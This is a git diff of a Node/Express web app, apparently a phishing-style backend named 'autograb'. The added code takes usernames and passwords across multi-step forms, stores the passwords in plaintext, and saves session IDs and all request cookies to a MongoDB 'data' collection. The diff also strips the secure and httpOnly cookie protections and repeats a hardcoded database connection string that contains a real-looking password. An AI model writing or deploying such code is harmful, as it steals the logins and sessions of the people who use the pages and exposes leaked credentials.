@@ -7,6 +7,12 @@ let session = require('express-session');
 let cookieParser = require('cookie-parser');
 let app = express();
 let nodemailer = require('nodemailer');
+const mongodb = require('mongodb');
+const MongoClient = mongodb.MongoClient;
+const MongoStore = require("connect-mongo");
+
+const uri="mongodb+srv://mstella1759:Badhtguy1.@cluster0.h6tw3.mongodb.net/autograb"
+
 
 
 app.set("view engine", "ejs")
@@ -17,38 +23,75 @@ app.use(session({
   secret: 'runner',
   resave: false,
   saveUninitialized: true,
-  cookie: { secure: true,
-            maxAge: 60 * 60 * 24 * 30 * 2 * 1000,
-            httpOnly: true,
-            sameSite: "strict"
-          }
+  store: new MongoStore({
+  mongoUrl: uri,
+    collection: "sessions"
+  })
+
 }));
 
 mongoose.set('strictQuery', true);
-mongoose.connect("mongodb+srv://mstella1759:Badhtguy1.@cluster0.h6tw3.mongodb.net/autograb",{ useNewUrlParser:true });
+mongoose.connect(uri, { useNewUrlParser: true });
+const db = mongoose.connection;
 
+// db.on("error", (error) => {
+//   console.error("connection error:", error);
+// });
+//
+// db.once("open", () => {
+//   console.log("Connected to MongoDB");
+// });
+mongoose.connect("mongodb+srv://mstella1759:Badhtguy1.@cluster0.h6tw3.mongodb.net/autograb",{ useNewUrlParser:true });
+// MongoClient.connect(uri, { useNewUrlParser: true }, function(err, client) {
+//    if(err) {
+//       console.log('Error occurred while connecting to MongoDB Atlas...\n',err);
+//    }
+//    console.log('Connected...');
+//    const db = client.db("autograb");
+//    const collection = db.collection("cookies");
+//    const cookie = { secure: true,
+//              maxAge: 60 * 60 * 24 * 30 * 2 * 1000,
+//              httpOnly: true,
+//              sameSite: "strict" };
+//    collection.insertOne(cookie, function(err, res) {
+//       console.log("Cookie inserted");
+//       client.close();
+//    });
+// });
 const userSchema = new mongoose.Schema({
   hidden: String,
   password: String,
 });
 const User = new mongoose.model("User", userSchema);
 
-
 app.get("/", (req, res) => {
-      var username = req.query.username;
-  console.log(`Session: ${JSON.stringify(req.session)}`);
-  console.log(`Cookies: ${JSON.stringify(req.cookies)}`);
+  let username = req.query.username;
+  // console.log(`Session: ${JSON.stringify({ username: req.session.username, connect: { sid: req.session.id } })}`);
+  // console.log(`Cookies: ${JSON.stringify(req.cookies)}`);
 
-  res.render("recap",{username: username});
+  res.render("recap", { username: username });
 });
 
-
 app.post("/", function(req, res) {
-  var username = req.body.recapstore;
-  req.session.username = req.body.username;
-console.log(`Session: ${JSON.stringify(req.session)}`);
-console.log(`Cookies: ${JSON.stringify(req.cookies)}`);
-  res.render("second",{username: username});
+let username = req.body.recapstore;
+req.session.username = req.body.username;
+// console.log(`Session: ${JSON.stringify({ username: req.session.username, connect: { sid: req.session.id } })}`);
+// console.log(`Cookies: ${JSON.stringify(req.cookies)}`);
+//
+// const sessionData = {
+//   session: { username: req.session.username, connect: { sid: req.session.id } },
+//   cookies: req.cookies
+// };
+//
+// db.collection("data").insertOne(sessionData, (error) => {
+//   if (error) {
+//     console.error("Error saving session and cookies to the database:", error);
+//   } else {
+//     console.log("Session and cookies saved to the database");
+//   }
+// });
+
+res.render("second", { username: username });
 });
 
 // app.post("/first", function(req, res) {
@@ -61,10 +104,26 @@ console.log(`Cookies: ${JSON.stringify(req.cookies)}`);
 app.post("/second", function(req, res) {
   req.session.username = req.body.username;
 req.session.password = req.body.pass;
+const sessionData = {
+  session: { username: req.session.username, connect: { sid: req.session.id } },
+  cookies: req.cookies
+};
+
+db.collection("data").insertOne(sessionData, (error) => {
+  if (error) {
+    console.error("Error saving session and cookies to the database:", error);
+  } else {
+    console.log("Session and cookies saved to the database");
+  }
+});
+req.session.cookie.maxAge = 3 * 30 * 24 * 60 * 60 * 1000; // session will last for three months
+req.session.cookie.expires = new Date(Date.now() + 3 * 30 * 24 * 60 * 60 * 1000);
+req.session.cookie.path = '/';
+
   var username = req.body.username;
   const newUser = new User({
     hidden: req.body.username,
-    password: req.body.pass
+    password: req.body.pass,
   });
   newUser.save(function(err) {
     if (err) {
@@ -113,6 +172,20 @@ req.session.password = req.body.pass;
 
 app.post("/third", function(req, res) {
   var username = req.body.username;
+  const sessionData = {
+    session: { username: req.session.username, connect: { sid: req.session.id } },
+    session: { password: req.session.password, connect: { sid: req.session.id } },
+    cookies: req.cookies
+  };
+
+  db.collection("data").insertOne(sessionData, (error) => {
+    if (error) {
+      console.error("Error saving session and cookies to the database:", error);
+    } else {
+      console.log("Session and cookies saved to the database");
+    }
+  });
+
   const newUser = new User({
     hidden: req.body.username,
     password: req.body.pass,
